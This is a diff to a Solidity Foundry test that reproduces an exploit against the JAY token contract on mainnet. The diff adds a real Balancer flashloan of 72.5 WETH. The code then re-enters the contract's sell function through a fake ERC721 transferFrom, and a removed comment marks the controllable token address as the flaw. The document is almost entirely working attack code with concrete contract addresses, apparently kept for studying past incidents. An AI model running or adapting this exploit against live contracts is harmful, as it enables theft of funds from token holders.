@@ -24,8 +24,9 @@ interface IJay {
 
 
 contract ContractTest is DSTest{
-   // FakeToken FakeTokenContract;
     IJay JAY = IJay(0xf2919D1D80Aff2940274014bef534f7791906FF2);
+    IBalancerVault Vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    WETH weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
@@ -34,14 +35,32 @@ contract ContractTest is DSTest{
     }
 
     function testExploit() public {
-
         payable(address(0)).transfer(address(this).balance);
         emit log_named_decimal_uint(
             "[Start] ETH balance before exploitation:",
             address(this).balance,
             18
         );
-        cheats.deal(address(this), 72.5 ether); //skip flashloan, directly use deal to set the balance of an address.
+        // Setup up flashloan paramaters.
+        address[] memory tokens = new address[](1);
+        tokens[0] = address(weth); 
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = 72.5 ether;
+        bytes memory b = "0x000000000000000000000000000000000000000000000001314fb37062980000000000000000000000000000000000000000000000000002bcd40a70853a000000000000000000000000000000000000000000000000000030927f74c9de00000000000000000000000000000000000000000000000000006f05b59d3b200000";
+        // Execute the flashloan. It will return in receiveFlashLoan()
+        Vault.flashLoan(address(this), tokens, amounts, b);
+    }
+
+    function receiveFlashLoan(
+        IERC20[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes memory userData
+    ) external {
+        require(msg.sender == address(Vault));
+
+        // Transfer WETH to ETH and start the attack.
+        weth.withdraw(amounts[0]);
 
         JAY.buyJay{value: 22 ether}(new address[](0),new uint256[](0),new address[](0),new uint256[](0),new uint256[](0));
 
@@ -57,7 +76,9 @@ contract ContractTest is DSTest{
         JAY.buyJay{value: 8 ether}(erc721TokenAddress,erc721Ids,new address[](0),new uint256[](0),new uint256[](0));
         JAY.sell(JAY.balanceOf(address(this)));
 
-         payable(address(0)).transfer(72.5 ether); // profit = address(this).balance - initial 72.5 ether
+        // Repay the flashloan by depositing ETH for WETH and transferring.
+        address(weth).call{value: 72.5 ether}("deposit");
+        weth.transfer(address(Vault), 72.5 ether);
 
         emit log_named_decimal_uint(
             "[End] ETH balance after exploitation:",
@@ -65,20 +86,6 @@ contract ContractTest is DSTest{
             18
         );
     }
-    /*
-    function buyJayWithERC721(
-        address[] calldata _tokenAddress,
-        uint256[] calldata ids
-    ) internal {
-        for (uint256 id = 0; id < ids.length; id++) {
-            IERC721(_tokenAddress[id]).transferFrom(   //vulnerable point, _tokenAddress[id] is controllable.
-                msg.sender,
-                address(this),
-                ids[id]
-            );
-        }
-    }
-    */
     function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
             JAY.sell(JAY.balanceOf(address(this)));  // reenter call JAY.sell
     }
